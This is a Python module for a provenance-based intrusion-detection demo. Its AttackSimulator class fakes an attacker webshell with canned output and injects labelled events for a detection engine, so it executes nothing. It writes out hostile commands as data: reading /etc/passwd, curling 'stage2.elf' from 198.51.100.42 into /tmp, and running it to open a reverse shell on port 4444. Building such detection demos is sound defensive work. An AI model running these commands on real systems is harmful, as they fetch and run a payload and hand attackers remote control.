import time
import random
from pathlib import Path
from typing import Dict, List, Any
from koton.data.schema import ProcessNode, FileNode, SocketNode, ProvenanceEvent
from koton.pipeline.streaming_engine import StreamingProvenanceEngine


class AttackSimulator:
    """
    Simulates realistic live APT attacks and injects events into the streaming engine.
    Used by Window 2 (Attacker WebShell) to demonstrate instant kill-chain detection.
    Covers the 4 canonical interactive scenarios:
      1. Recon (whoami, id, uname -a)
      2. Credential Dumping (cat /etc/passwd)
      3. Dropper (curl -O ... /tmp/exploit.sh)
      4. Privilege Escalation (SUID abuse & Reverse Shell C2)
    """

    def __init__(self, engine: StreamingProvenanceEngine):
        self.engine = engine

    def execute_command(self, cmd: str) -> Dict[str, Any]:
        """
        Interprets commands entered into Window 2 (Attacker WebShell)
        and translates them into real-time provenance events.
        """
        cmd_clean = cmd.strip()
        t = time.time()

        if not cmd_clean:
            return {"command": cmd, "output": "", "stage": "none", "technique": ""}

        lower = cmd_clean.lower()

        # 1. Reconnaissance (whoami, id, uname, ps, netstat)
        if any(k in lower for k in ["whoami", "id", "uname", "ps aux", "netstat", "hostname"]):
            output_lines = [
                "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)",
                "Linux koton-victim-wsl2 5.15.153.1-microsoft-standard-WSL2 x86_64 GNU/Linux",
                "PID   USER     COMMAND",
                "1     root     /sbin/init",
                "450   root     /sbin/auditd",
                "1024  www-data python3 server.py --port 5000",
                "7120  www-data /bin/sh -c (webshell listener)"
            ]
            self._inject_recon_events(t, cmd_clean)
            stage = "Reconnaissance (T1033 / T1082)"
            technique = "T1033"

        # 2. Credential Dumping (cat /etc/passwd, /etc/shadow, id_rsa)
        elif any(k in lower for k in ["passwd", "shadow", "sudoers", "id_rsa"]):
            output_lines = [
                "root:x:0:0:root:/root:/bin/bash",
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
                "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
                "www-data:x:1000:1000:www-data:/var/www:/bin/sh",
                "sysadmin:x:1001:1001:System Admin:/home/sysadmin:/bin/bash",
                "koton_agent:x:1002:1002:SOC Auditor:/home/koton:/bin/bash"
            ]
            self._inject_credential_dump_events(t, cmd_clean)
            stage = "Credential Dumping (T1005 / T1087)"
            technique = "T1005"

        # 3. Dropper (curl, wget, download exploit payload)
        elif any(k in lower for k in ["curl", "wget", "dropper"]):
            output_lines = [
                "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current",
                "100 52340  100 52340    0     0   512k      0 --:--:-- --:--:-- --:--:--  512k",
                "[+] Successfully fetched payload from http://198.51.100.42:8080/stage2.elf",
                "[+] Saved binary to: /tmp/stage2.elf (ELF 64-bit LSB executable, x86-64)"
            ]
            self._inject_dropper_events(t, cmd_clean)
            stage = "Dropper / Ingress Tool Transfer (T1105)"
            technique = "T1105"

        # 4. Privilege Escalation & C2 (chmod, SUID abuse, root shell, reverse shell)
        elif any(k in lower for k in ["chmod", "suid", "exploit", "4444", "reverse", "root", "stage2"]):
            output_lines = [
                "[*] Scanning for SUID binaries with pkexec / sudo vulnerability...",
                "[+] Vulnerable SUID binary discovered: /usr/bin/find (perms: 4755)",
                "[*] Executing privilege escalation payload via /tmp/stage2.elf...",
                "[+] Exploit successful: Effective UID elevated from 1000 to 0 (ROOT)!",
                "[*] Establishing encrypted reverse shell connection to C2 (198.51.100.42:4444)...",
                "[+] Reverse Shell Connection ESTABLISHED! [SESSION #1 - ROOT@VICTIM-WSL2]"
            ]
            self._inject_privesc_and_c2_events(t, cmd_clean)
            stage = "Privilege Escalation & C2 (T1068 / T1071)"
            technique = "T1068"

        # Safe system commands
        elif "ls" in lower:
            output_lines = [
                "total 36",
                "drwxr-xr-x 4 www-data www-data 4096 Oct 15 20:00 .",
                "drwxr-xr-x 3 root     root     4096 Oct 14 11:00 ..",
                "-rw-r--r-- 1 www-data www-data 6564 Oct 15 20:30 server.py",
                "drwxr-xr-x 2 www-data www-data 4096 Oct 15 20:35 uploads",
                "drwxr-xr-x 4 www-data www-data 4096 Oct 15 20:25 templates"
            ]
            self._inject_generic_attack_events(t, cmd_clean)
            stage = "Discovery (T1083)"
            technique = "T1083"

        elif "pwd" in lower:
            output_lines = ["/var/www/victim-app"]
            stage = "Discovery (T1083)"
            technique = "T1083"

        else:
            output_lines = [f"[shell] Executed: {cmd_clean}", "[+] Return code: 0"]
            self._inject_generic_attack_events(t, cmd_clean)
            stage = "Execution (T1059)"
            technique = "T1059"

        return {
            "command": cmd_clean,
            "output": "\n".join(output_lines),
            "stage": stage,
            "technique": technique,
            "timestamp": t
        }

    def run_full_kill_chain(self) -> List[Dict[str, Any]]:
        """
        Executes the end-to-end 4-stage kill chain sequentially:
        1. Recon -> 2. Credential Dumping -> 3. Dropper -> 4. PrivEsc & C2
        """
        chain = [
            "whoami && id && uname -a",
            "cat /etc/passwd",
            "curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf",
            "chmod +x /tmp/stage2.elf && /tmp/stage2.elf --connect 198.51.100.42:4444"
        ]
        results = []
        for cmd in chain:
            res = self.execute_command(cmd)
            results.append(res)
            time.sleep(0.3)
        return results

    def _inject_recon_events(self, t: float, cmd: str):
        pid = random.randint(7100, 7200)
        sh_key = f"proc:{pid}:sh"
        sh_proc = ProcessNode(
            key=sh_key, pid=pid, name="sh", cmdline=f"/bin/sh -c '{cmd}'",
            path="/bin/sh", uid=1000, timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_process(sh_proc)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key="proc:1024:python_web",
            relation="fork", dst_type="process", dst_key=sh_key, is_attack=True,
            metadata={"technique": "T1033", "stage": "Reconnaissance"}
        ))

    def _inject_credential_dump_events(self, t: float, cmd: str):
        pid = random.randint(7201, 7300)
        cat_key = f"proc:{pid}:cat"
        cat_proc = ProcessNode(
            key=cat_key, pid=pid, name="cat", cmdline=f"cat /etc/passwd",
            path="/bin/cat", uid=1000, timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_process(cat_proc)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key="proc:1024:python_web",
            relation="fork", dst_type="process", dst_key=cat_key, is_attack=True,
            metadata={"technique": "T1005", "stage": "Credential Dumping"}
        ))
        passwd_file = FileNode(key="file:/etc/passwd", path="/etc/passwd", timestamp=t, label=1, is_anomaly=True)
        self.engine.add_file(passwd_file)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key=cat_key,
            relation="read", dst_type="file", dst_key="file:/etc/passwd", is_attack=True,
            metadata={"technique": "T1005", "stage": "Sensitive File Read"}
        ))

    def _inject_dropper_events(self, t: float, cmd: str):
        pid = random.randint(7301, 7400)
        curl_key = f"proc:{pid}:curl"
        curl_proc = ProcessNode(
            key=curl_key, pid=pid, name="curl",
            cmdline="curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf",
            path="/usr/bin/curl", uid=1000, timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_process(curl_proc)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key="proc:1024:python_web",
            relation="fork", dst_type="process", dst_key=curl_key, is_attack=True,
            metadata={"technique": "T1105", "stage": "Ingress Tool Transfer"}
        ))
        stage2_file = FileNode(
            key="file:/tmp/stage2.elf", path="/tmp/stage2.elf", extension=".elf",
            timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_file(stage2_file)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key=curl_key,
            relation="write", dst_type="file", dst_key=stage2_file.key, is_attack=True,
            metadata={"technique": "T1105", "stage": "Payload Dropped to /tmp"}
        ))

    def _inject_privesc_and_c2_events(self, t: float, cmd: str):
        pid = random.randint(7401, 7500)
        exploit_key = f"proc:{pid}:stage2.elf"
        exploit_proc = ProcessNode(
            key=exploit_key, pid=pid, name="stage2.elf",
            cmdline="/tmp/stage2.elf", path="/tmp/stage2.elf",
            uid=0, timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_process(exploit_proc)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key="proc:1024:python_web",
            relation="exec", dst_type="process", dst_key=exploit_key, is_attack=True,
            metadata={"technique": "T1068", "stage": "Privilege Escalation"}
        ))
        c2_sock = SocketNode(
            key="sock:198.51.100.42:4444", ip="198.51.100.42", port=4444,
            timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_socket(c2_sock)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key=exploit_key,
            relation="connect", dst_type="socket", dst_key=c2_sock.key, is_attack=True,
            metadata={"technique": "T1071", "stage": "C2 Reverse Shell Established"}
        ))

    def _inject_generic_attack_events(self, t: float, cmd: str):
        pid = random.randint(7501, 7600)
        p_key = f"proc:{pid}:bash"
        proc = ProcessNode(
            key=p_key, pid=pid, name="bash", cmdline=cmd,
            path="/bin/bash", uid=1000, timestamp=t, label=1, is_anomaly=True
        )
        self.engine.add_process(proc)
        self.engine.push_event(ProvenanceEvent(
            timestamp=t, src_type="process", src_key="proc:1024:python_web",
            relation="fork", dst_type="process", dst_key=p_key, is_attack=True,
            metadata={"technique": "T1059", "stage": "Subshell Execution"}
        ))
